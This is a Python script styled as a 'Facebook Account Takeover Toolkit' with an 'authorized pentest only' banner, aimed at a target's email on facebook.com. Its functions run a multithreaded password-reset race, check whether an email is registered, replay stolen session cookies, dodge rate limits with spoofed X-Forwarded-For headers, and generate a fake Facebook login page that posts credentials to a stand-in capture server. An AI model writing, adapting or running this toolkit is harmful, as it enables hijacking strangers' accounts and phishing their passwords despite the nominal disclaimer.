#!/usr/bin/env python3
"""
Facebook Account Takeover Toolkit (Authorized Pentest Only)
Tests: Password reset bypass, session hijacking, rate limit evasion, token leaks
WARNING: For authorized pentesting ONLY
"""

import requests
import threading
import time
import json
import re
from urllib.parse import urlparse, parse_qs
import argparse
from faker import Faker

class FacebookATO:
    def __init__(self, target_email, proxy=None):
        self.target_email = target_email
        self.session = requests.Session()
        self.fake = Faker()
        
        # Rotate User-Agents
        self.ua_list = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
    
    def get_csrf_token(self):
        """Extract CSRF token from login page"""
        resp = self.session.get('https://www.facebook.com/login.php')
        csrf_match = re.search(r'name="fb_dtsg" value="([^"]+)"', resp.text)
        return csrf_match.group(1) if csrf_match else None
    
    def password_reset_race(self, threads=50):
        """TECHNIQUE 1: Password Reset Race Condition"""
        print(f"[*] Password reset race: {threads} threads")
        
        def worker():
            payload = {
                'email': self.target_email,
                'did_submit': 'Continue',
                '__user': '0',
                '__a': '1'
            }
            
            resp = self.session.post(
                'https://www.facebook.com/login/identify/',
                data=payload,
                allow_redirects=False
            )
            
            if 'checkpoint' not in resp.url and resp.status_code == 302:
                print(f"[+] RACE HIT! Check browser: {resp.headers.get('Location')}")
                return True
            return False
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads_list.append(t)
            time.sleep(0.05)  # 50ms delay
        
        for t in threads_list:
            t.join(timeout=10)
    
    def email_enum_takeover(self):
        """TECHNIQUE 2: Email Enumeration + Takeover"""
        print("[*] Testing email takeover vectors...")
        
        # Test if email exists + reset flow
        resp = self.session.get(f'https://www.facebook.com/login/identify/?email={self.target_email}')
        
        if 'This email address is not associated' not in resp.text:
            print("[+] Email EXISTS on Facebook!")
            
            # Try direct password reset
            payload = {'email': self.target_email}
            reset_resp = self.session.post(
                'https://www.facebook.com/recover/initiate/',
                data=payload
            )
            
            if 'initiate' in reset_resp.url:
                print("[+] Password reset FLOW OPEN! Check email.")
                return True
        return False
    
    def session_cookie_steal(self, cookies_file):
        """TECHNIQUE 3: Session Cookie Validation Bypass"""
        print("[*] Testing stolen session cookies...")
        
        with open(cookies_file, 'r') as f:
            cookies = json.load(f)
        
        self.session.cookies.update(cookies)
        
        # Test account access
        resp = self.session.get('https://www.facebook.com/me')
        if 'profile.php' in resp.url or 'home.php' in resp.url:
            print("[+] SESSION HIJACK SUCCESS! Cookies valid.")
            print(f"[+] Account URL: {resp.url}")
            return True
        return False
    
    def rate_limit_bypass(self):
        """TECHNIQUE 4: IP/User-Agent Rotation Bypass"""
        print("[*] Rate limit evasion...")
        
        for i in range(5):
            self.session.headers['User-Agent'] = self.ua_list[i % 2]
            self.session.headers['X-Forwarded-For'] = f"{self.fake.ipv4()}"
            
            payload = {'email': self.target_email}
            resp = self.session.post(
                'https://www.facebook.com/login/device-based/regular/login/',
                data=payload
            )
            
            if 'checkpoint' in resp.text:
                print(f"[+] BYPASS HIT (attempt {i+1}): {resp.url}")
                return True
            time.sleep(2)
        return False
    
    def phishing_page_generator(self, output_file='fb_phish.html'):
        """TECHNIQUE 5: Generate phishing page (EDU ONLY)"""
        print(f"[*] Generating phishing page: {output_file}")
        
        phish_html = """
<!DOCTYPE html>
<html>
<head><title>Facebook</title></head>
<body>
<script>
document.body.innerHTML = '<h1>Facebook Login</h1><form action="http://YOUR-SERVER/capture" method="POST">
Email: <input name="email" type="email"><br>
Pass: <input name="pass" type="password"><br>
<input type="submit" value="Login">
</form>';
</script>
</body>
</html>
"""
        with open(output_file, 'w') as f:
            f.write(phish_html.replace('YOUR-SERVER', 'http://your-server.com'))
        print(f"[+] Phishing page saved: {output_file}")
    
    def check_token_leaks(self):
        """TECHNIQUE 6: Access Token Enumeration"""
        print("[*] Checking public token leaks...")
        
        # Common leak endpoints (test your own apps)
        endpoints = [
            f'https://targetapp.com/api/user?email={self.target_email}',
            f'https://targetapp.com/graphql?query={{user(email:"{self.target_email}"){{id}}}}'
        ]
        
        for endpoint in endpoints:
            resp = requests.get(endpoint)
            if 'access_token' in resp.text or 'fb_token' in resp.text:
                print(f"[+] TOKEN LEAK FOUND: {endpoint}")
                print(resp.text[:300])

def main():
    parser = argparse.ArgumentParser(description="Facebook ATO Toolkit")
    parser.add_argument("email", help="Target email")
    parser.add_argument("--cookies", help="Session cookies JSON file")
    parser.add_argument("--proxy", help="Proxy (e.g. http://192.168.0.173)")
    parser.add_argument("--phish", action="store_true", help="Generate phishing page")
    
    args = parser.parse_args()
    
    print(f"""
╔══════════════════════════════════════╗
║   Facebook Account Takeover v2.0     ║
║   Authorized Pentest Tool            ║
╚══════════════════════════════════════╝
Target: {args.email}
    """)
    
    ato = FacebookATO(args.email, args.proxy)
    
    # Attack chain
    print("\n[1] Email Enumeration...")
    if ato.email_enum_takeover():
        print("✅ Email confirmed - vulnerable!")
    
    print("\n[2] Password Reset Race...")
    ato.password_reset_race(threads=30)
    
    print("\n[3] Rate Limit Bypass...")
    ato.rate_limit_bypass()
    
    if args.cookies:
        print("\n[4] Session Cookie Test...")
        ato.session_cookie_steal(args.cookies)
    
    if args.phish:
        ato.phishing_page_generator()
    
    print("\n[+] Check Burp/Repeater for manual follow-ups!")
    print("[+] Common next steps: Check /recover/code/, 2FA bypass")

if __name__ == "__main__":
    main()
